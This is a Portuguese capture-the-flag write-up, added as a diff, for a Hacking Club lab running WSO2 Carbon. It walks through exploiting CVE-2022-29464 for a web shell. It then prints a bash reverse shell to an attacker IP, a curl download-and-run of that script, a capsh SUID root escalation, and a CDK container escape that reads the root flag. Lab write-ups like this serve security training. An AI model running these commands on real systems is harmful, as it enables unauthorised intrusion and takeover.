@@ -1,0 +1,229 @@
+---
+title: 'Interface Writeup'
+date: '2024-10-16'
+tags: ['CVE-2022-29464', 'Linux']
+draft: false
+summary: 'Writeup do CTF Moon da Hacking Club.'
+images: ['/static/images/interface-writeup-images/1.png']
+authors: ['default']
+---
+
+![Interface 1](/static/images/interface-writeup-images/1.png)
+
+## **Plataforma**: Hacking Club
+
+### **Dificuldade:** Easy
+
+### **Nome**: Renderizer
+
+### IP: 172.16.2.58
+
+---
+
+## Port Scanning
+
+`nmap -sV -sC -p- -v $IP --open`
+
+```
+PORT     STATE SERVICE             VERSION
+22/tcp   open  ssh                 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 87:f4:7d:72:e8:81:37:7b:99:bc:28:84:78:ac:18:2e (RSA)
+|   256 12:a0:b3:69:ab:93:69:a2:00:b6:25:06:71:0c:61:fb (ECDSA)
+|_  256 b6:17:25:3a:50:58:4f:61:f3:09:f2:d3:01:76:ed:1d (ED25519)
+9443/tcp open  ssl/tungsten-https?
+| ssl-cert: Subject: commonName=localhost/organizationName=WSO2/stateOrProvinceName=CA/countryName=US
+| Subject Alternative Name: DNS:localhost
+| Issuer: commonName=localhost/organizationName=WSO2/stateOrProvinceName=CA/countryName=US
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2019-10-23T07:30:43
+| Not valid after:  2022-01-25T07:30:43
+| MD5:   722a:bf36:2d0d:e587:6d53:e96c:92a1:a550
+|_SHA-1: 57ff:38d9:7664:c792:ff88:0117:1f04:191d:ed88:778d
+|_ssl-date: TLS randomness does not represent time
+| fingerprint-strings:
+|   DNSStatusRequestTCP, Help:
+|     HTTP/1.1 400
+|     Content-Length: 0
+|     Date: Wed, 16 Oct 2024 16:28:44 GMT
+|     Connection: close
+|     Server: WSO2 Carbon Server
+|   DNSVersionBindReqTCP, RPCCheck:
+|     HTTP/1.1 400
+|     Content-Length: 0
+|     Date: Wed, 16 Oct 2024 16:28:43 GMT
+|     Connection: close
+|     Server: WSO2 Carbon Server
+|   GetRequest:
+|     HTTP/1.1 302
+|     X-Content-Type-Options: nosniff
+|     X-XSS-Protection: 1; mode=block
+|     Set-Cookie: JSESSIONID=51AE67BBD410A643B96217D15C6B012B; Path=/; Secure; HttpOnly
+|     Location: https://api-manager.hackingclub.local:9443/publisher/
+|     Content-Length: 0
+|     Date: Wed, 16 Oct 2024 16:28:36 GMT
+|     Connection: close
+|     Server: WSO2 Carbon Server
+|   HTTPOptions:
+|     HTTP/1.1 302
+|     X-Content-Type-Options: nosniff
+|     X-XSS-Protection: 1; mode=block
+|     Set-Cookie: JSESSIONID=F8512F908C5A640B577030029959400A; Path=/; Secure; HttpOnly
+|     Location: https://api-manager.hackingclub.local:9443/publisher/
+|     Content-Length: 0
+|     Date: Wed, 16 Oct 2024 16:28:42 GMT
+|     Connection: close
+|     Server: WSO2 Carbon Server
+|   RTSPRequest:
+|     HTTP/1.1 400
+|     Content-Length: 0
+|     Date: Wed, 16 Oct 2024 16:28:42 GMT
+|     Connection: close
+|     Server: WSO2 Carbon Server
+|   SSLSessionReq:
+|     HTTP/1.1 400
+|     Content-Length: 0
+|     Date: Wed, 16 Oct 2024 16:28:46 GMT
+|     Connection: close
+|_    Server: WSO2 Carbon Server
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9443-TCP:V=7.94SVN%T=SSL%I=7%D=10/16%Time=670FE9B4%P=x86_64-pc-linu
+SF:x-gnu%r(GetRequest,14E,"HTTP/1\.1\x20302\x20\r\nX-Content-Type-Options:
+SF:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nSet-Cookie:\x20
+SF:JSESSIONID=51AE67BBD410A643B96217D15C6B012B;\x20Path=/;\x20Secure;\x20H
+SF:ttpOnly\r\nLocation:\x20https://api-manager\.hackingclub\.local:9443/pu
+SF:blisher/\r\nContent-Length:\x200\r\nDate:\x20Wed,\x2016\x20Oct\x202024\
+SF:x2016:28:36\x20GMT\r\nConnection:\x20close\r\nServer:\x20WSO2\x20Carbon
+SF:\x20Server\r\n\r\n")%r(HTTPOptions,14E,"HTTP/1\.1\x20302\x20\r\nX-Conte
+SF:nt-Type-Options:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\
+SF:nSet-Cookie:\x20JSESSIONID=F8512F908C5A640B577030029959400A;\x20Path=/;
+SF:\x20Secure;\x20HttpOnly\r\nLocation:\x20https://api-manager\.hackingclu
+SF:b\.local:9443/publisher/\r\nContent-Length:\x200\r\nDate:\x20Wed,\x2016
+SF:\x20Oct\x202024\x2016:28:42\x20GMT\r\nConnection:\x20close\r\nServer:\x
+SF:20WSO2\x20Carbon\x20Server\r\n\r\n")%r(RTSPRequest,78,"HTTP/1\.1\x20400
+SF:\x20\r\nContent-Length:\x200\r\nDate:\x20Wed,\x2016\x20Oct\x202024\x201
+SF:6:28:42\x20GMT\r\nConnection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20
+SF:Server\r\n\r\n")%r(RPCCheck,78,"HTTP/1\.1\x20400\x20\r\nContent-Length:
+SF:\x200\r\nDate:\x20Wed,\x2016\x20Oct\x202024\x2016:28:43\x20GMT\r\nConne
+SF:ction:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n")%r(DNSV
+SF:ersionBindReqTCP,78,"HTTP/1\.1\x20400\x20\r\nContent-Length:\x200\r\nDa
+SF:te:\x20Wed,\x2016\x20Oct\x202024\x2016:28:43\x20GMT\r\nConnection:\x20c
+SF:lose\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n")%r(DNSStatusReques
+SF:tTCP,78,"HTTP/1\.1\x20400\x20\r\nContent-Length:\x200\r\nDate:\x20Wed,\
+SF:x2016\x20Oct\x202024\x2016:28:44\x20GMT\r\nConnection:\x20close\r\nServ
+SF:er:\x20WSO2\x20Carbon\x20Server\r\n\r\n")%r(Help,78,"HTTP/1\.1\x20400\x
+SF:20\r\nContent-Length:\x200\r\nDate:\x20Wed,\x2016\x20Oct\x202024\x2016:
+SF:28:44\x20GMT\r\nConnection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Se
+SF:rver\r\n\r\n")%r(SSLSessionReq,78,"HTTP/1\.1\x20400\x20\r\nContent-Leng
+SF:th:\x200\r\nDate:\x20Wed,\x2016\x20Oct\x202024\x2016:28:46\x20GMT\r\nCo
+SF:nnection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+
+Foram descobertos apenas as portas 22 (SSH) e 9443 (HTTPS) abertas.
+
+## Enumeration
+
+### https://172.16.2.58:9443
+
+O servidor nos redireciona para `https://api-manager.hackingclub.local:9443/publisher/`
+
+![interface 2](/static/images/interface-writeup-images/2.png)
+
+Precisamos adicionar o nome que o servidor esta procurando no DNS local, que no caso é o `api-manager.hackingclub.local`
+
+`sudo vim /etc/host`
+
+![interface 3](/static/images/interface-writeup-images/3.png)
+
+No scan do NMAP foi possível identificar o tipo de servidor que esta rodando (Server: WSO2 Carbon Server). No entanto, não foi possível pegar a versão.
+
+Pra achar a versão do servidor, existe um endpoint chamado `/services/Version`
+
+![interface 3](/static/images/interface-writeup-images/4.png)
+
+Com a versão em mãos, foi possível identificar algumas CVEs relacionadas.
+
+![interface 5](/static/images/interface-writeup-images/5.png)
+
+Após executar o exploit, foi possível ganhar uma web-shell.
+
+```
+git clone https://github.com/oppsec/wsob.git
+pip3 install -r requirements.txt
+python3 main.py -u https://api-manager.hackingclub.local:9443
+```
+
+![interface 6](/static/images/interface-writeup-images/6.png)
+![interface 7](/static/images/interface-writeup-images/7.png)
+
+Com isso podemos pegar uma reverse-shell.
+
+A tentativa de obter a shell de modo tradicional não funcionou, pois o servidor não executava os comandos diretamente. A alternativa foi enviar um script via `curl` e salvá-lo na pasta `/tmp`.
+
+`shell.sh`
+
+```python
+#!/bin/bash
+bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1337 <&1'
+```
+
+`WebShell`
+
+```python
+curl http://10.0.31.150:8000/shell.sh -o /tmp/revshell.sh
+
+chmod +x /tmp/revshell.sh
+
+bash /tmp/revshell.sh
+```
+
+![interface 8](/static/images/interface-writeup-images/8.png)
+![interface 9](/static/images/interface-writeup-images/9.png)
+
+---
+
+## Privillege Escalation
+
+Utilizei o Linpeas para enumerar possíveis vetores de escalação de privilégios e identifiquei um SUID que pode ser explorado para obter acesso root.
+
+![interface 10](/static/images/interface-writeup-images/10.png)
+
+Foi possível encontrar esse SUID no GTFOBins.
+
+![interface 11](/static/images/interface-writeup-images/11.png)
+Basta rodar o seguinte comando para obter acesso root:
+
+`/usr/sbin/capsh --gid=0 --uid=0 --`
+![interface 12](/static/images/interface-writeup-images/12.png)
+
+---
+
+## Privillege Escalation 2 - Docker Breakout
+
+Utilizamos uma ferramenta chamada “DEEPCE” ([https://github.com/stealthcopter/deepce](https://github.com/stealthcopter/deepce)) para auxiliar na fuga do Docker. Essa ferramenta é semelhante ao Linpeas, mas focada em enumeração de Dockers e Containers.
+
+Após baixar o script e jogar pra maquina alvo, ele descobriu algumas Capabilities que podemos utilizar pra 'escapar' do docker, nesse caso utilizaremos ela para ler a flag final do CTF.
+![interface 13](/static/images/interface-writeup-images/13.png)
+
+Podemos utilizar a capability `CAP_DAC_READ_SEARCH` para ler qualquer arquivo do servidor.
+
+Vamos utilizar a ferramenta “CDK ([https://github.com/cdk-team/CDK](https://github.com/cdk-team/CDK))” para nos ajudar a explorar essa capability. CDK se trata de uma ferramenta open-source desenvolvida especificamente para pentest em containers.
+
+Após transferir o arquivo para a maquina alvo, podemos executar ele com o seguinte comando:
+
+```
+chmod +x cdk_linux_amd64
+./cdk_linux_amd64 run cap-dac-read-search /root/root.txt
+```
+
+![interface 14](/static/images/interface-writeup-images/14.png)
+
+---
+
+## Proof
+
+![interface 15](/static/images/interface-writeup-images/15.png)
